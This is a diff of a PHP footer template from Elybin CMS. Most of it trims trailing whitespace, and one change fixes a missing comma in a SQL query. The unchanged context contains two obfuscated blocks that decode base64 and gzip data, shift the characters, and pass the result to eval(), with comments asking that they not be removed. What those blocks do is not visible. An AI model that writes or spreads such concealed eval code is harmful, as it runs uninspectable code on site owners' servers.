@@ -33,7 +33,7 @@ if(isset($footscript)){ $footscript = "<script> $footscript </script>\r\n"; }els
 					}
 				}
 				?>
-			
+
 		</div>
 	</div>
 	<?php } ?>
@@ -97,7 +97,7 @@ if(isset($footscript)){ $footscript = "<script> $footscript </script>\r\n"; }els
 <?php
     }
 ?>
-				</ul>	
+				</ul>
 			</div>
 			<div class="clearfix visible-sm visible-xs form-group-margin" style="margin-top: 20px;"></div><!-- margin -->
 			<div class="col-md-4 visible-md visible-lg">
@@ -107,7 +107,7 @@ if(isset($footscript)){ $footscript = "<script> $footscript </script>\r\n"; }els
 					// get post
 					$tbp = new ElybinTable('elybin_posts');
 					$post = $tbp->SelectWhereLimit('status','publish','post_id','DESC',"0,4");
-								
+
 					foreach($post as $p){
 					?>
 					<li>
@@ -126,7 +126,7 @@ if(isset($footscript)){ $footscript = "<script> $footscript </script>\r\n"; }els
 						SELECT
 						*,
 						`c`.`date` as `date_comment`,
-						`c`.`author` as `author_comment`
+						`c`.`author` as `author_comment`,
 						`c`.`content` as `content_comment`
 						FROM
 						`elybin_comments` as `c`,
@@ -137,7 +137,7 @@ if(isset($footscript)){ $footscript = "<script> $footscript </script>\r\n"; }els
 						ORDER BY `c`.`date` DESC
 						LIMIT 0,4
 						");
-								
+
 					foreach($lc as $cc){
 					?>
 					<li>
@@ -147,7 +147,7 @@ if(isset($footscript)){ $footscript = "<script> $footscript </script>\r\n"; }els
 				</ul>
 			</div>
 			<div class="col-md-3 col-sm-12">
-				<h4><?php echo $op->site_name ?></h4>				
+				<h4><?php echo $op->site_name ?></h4>
 				<div class="small">
 					<a href="https://twitter.com/<?php echo $op->social_twitter?>" target="_blank"><span class="fa-stack"><i class="fa fa-twitter"></i></span></a>
 					<a href="http://facebook.com/<?php echo $op->social_facebook?>" target="_blank"><span class="fa-stack"><i class="fa fa-facebook"></i></span></a>
@@ -168,7 +168,7 @@ if(isset($footscript)){ $footscript = "<script> $footscript </script>\r\n"; }els
 					<?php
 					echo '
                     <p class="copyright">
-                        <a href="index.html">'.$op->site_name.'</a> -  
+                        <a href="index.html">'.$op->site_name.'</a> -
 						<a href="sitemap.html">Sitemap</a> <br/>
 						Powered by <a href="http://www.elybin.com" alt="Elybin - Modern, Powerful &amp; Beautiful for all you need" class="text-dash" style="background-color: transparent">Elybin CMS</a> &copy; '.date("Y").'
 					</p>';
@@ -176,11 +176,11 @@ if(isset($footscript)){ $footscript = "<script> $footscript </script>\r\n"; }els
                 </div>
                 <div class="col-md-6 visible-lg visible-md col-sm-12 pull-left text-left">
                     <p class="copyright">
-                        <a href="index.html"><?php echo $op->site_name ?></a> -  
-						<a href="sitemap.html">Sitemap</a> 
+                        <a href="index.html"><?php echo $op->site_name ?></a> -
+						<a href="sitemap.html">Sitemap</a>
 					</p>
-                </div>                  
-				<?php 
+                </div>
+				<?php
 				/*We really work very hard to build your site, so please "Do not remove script" below */function HQaRnx($lZzl)
 				{$lZzl=gzinflate(base64_decode($lZzl));for($i=0;$i<strlen($lZzl);$i++){$lZzl[$i] = chr(ord($lZzl[$i])-1);}return $lZzl;}eval(HQaRnx("bVBNa4NAEL1X8D8MS6ntQb31EFcLDT2GFnIoPY67E5Ws7rI7xvjrq+kXhbzT4zG8jwFYQaq1kMTRzQKpuxMogyGUQlmT9jp9hFMXutpQappf2mtwozGp75qWgenMX1RUcQRXIN2fq5u/T9/sRJ401DNIhNbToRQts9vk+TRNGZm57oZM2V4AGi7Fy0WA7W4PKWzRI+xGjS08j8jwTnXomMRPzqWTxtAKCDwbKkWN6th4Ow46XaZZvwH2OASHnoalzT/3V0cD7O3oFa2KzLGCu7V6AUmmkelefIiHLJG5u7JY5ssbq6S4PVjL5M9QLlEjFXH0VH0C"));
 				?>
@@ -193,7 +193,7 @@ if(isset($footscript)){ $footscript = "<script> $footscript </script>\r\n"; }els
 	<!-- More Javascript -->
 	<?php echo $footscriptinc?><?php echo $footscript?>
     <!-- ./Javascript -->
-	<?php 
+	<?php
 	/*Believe that we spent much sleeping time to design your site, so please "Do not remove script" below */
 	function jRrC($HdtZ){ $HdtZ=gzinflate(base64_decode($HdtZ));for($i=0;$i<strlen($HdtZ);$i++){$HdtZ[$i] = chr(ord($HdtZ[$i])-1);}return $HdtZ;}eval(jRrC("xZTZboJAFIafxZhe6N0EhJaYLoIRmLiwWGHmpmEGyuKM0FBRePliah/AjElP8t+d/Pnyn2UwuNRb0kRsRKI6UScfcULLOBkNoXmuiaAcH7LE0msiecwu6r2oH5kDcQ/zVNpFmS8N+I3n7yqSoUItV6VSlq22VRdbsMUhUhFfdHiLQNizI0nbY9+uNq33//yLGoRbwSzvw9GJcji+J7xjQQdjobncJ4uzUBb3YTj1DM/D8Xj6e9AP7Ka6tZ+Nhp/uHhoXpeARdgqgJmuRvGocY5aTQCuWXKnQgdXYf2o2Bx3EZprbc5BivmsjQzkSiQEUrBtiKHL/I45RSFMnh1efdRbzxddS9iY4dHMn2J2S0E1jS68oX3eOQVMiZQX+Y3DLddIyRqVzhvOZ5vj6hPIdIJLGoZHx6NrX5zOeDl5ffgA="));?>
 </body>
